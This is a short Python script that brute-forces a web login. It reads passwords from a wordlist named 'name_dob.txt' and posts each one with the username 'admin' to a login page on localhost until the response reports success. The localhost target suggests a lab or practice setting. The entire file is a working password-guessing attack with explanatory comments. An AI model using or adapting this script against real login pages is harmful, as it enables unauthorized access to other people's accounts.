import requests  # Importing the requests module for making HTTP requests

URL = "http://127.0.0.1:5000/"  # Targets login page
USERNAME = "admin"  # Known username
WORDLIST = "name_dob.txt"  

with open(WORDLIST, "r") as f:
    # Iterate through each password in the wordlist
    for password in f:
        password = password.strip()  # Removes any leading/trailing whitespaces or newlines
        # Sends a POST request to the login page with the current username and password
        response = requests.post(URL, data={"username": USERNAME, "password": password})  
        
        if "Login successful!" in response.text:
            # Checks if the response contains the success message "Login successful!" in the response text.
            # response.text contains the body of the HTTP response as a string, which may include HTML, JSON, or other content.
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[-] Tried: {password}")
